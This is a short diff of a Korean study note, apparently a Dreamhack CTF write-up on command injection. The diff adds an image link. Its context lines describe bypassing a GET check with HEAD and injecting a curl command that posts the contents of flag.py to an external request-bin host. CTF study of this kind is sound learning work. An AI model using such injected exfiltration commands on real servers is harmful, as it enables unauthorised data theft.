@@ -43,6 +43,7 @@ GET 메소드 외에 서버에서 허용하는 메소드로 cmd를 요청하면 
     - GET 메소드가 아니어야 하기 때문에 HEAD 메소드를 사용함
 
 2. 외부에 있는 웹 서버로 flag.py 파일 실행 결과를 전송해야 하기 때문에 외부 웹 서버를 준비시키고, 문제 사이트의 URL에서 cmd의 값을 ```curl https://hjvreie.request.dreamhack.games/ -d "$(cat flag.py)"```으로 하고 새로고침함
+  <img width="925" alt="Request Packet " src="https://github.com/augustf86/Today_I_Learn/assets/122844932/71ccd4d6-1e52-42b0-9c17-7a75fb5dbe57"><br/>
     - 외부 웹 서버로는 드림핵 툴즈 서비스의 Request Bin 기능을 이용했음
     - ```curl``` 명령어: 프로토콜들을 이용해 URL로 데이터를 전송하여 서버에 데이터를 보내거나 가져올 때 사용하기 위한 명령줄 도구 및 라이브러리
         - ```-d``` 옵션: (data) HTTP POST 요청 데이터 입력 (body 데이터를 입력함)
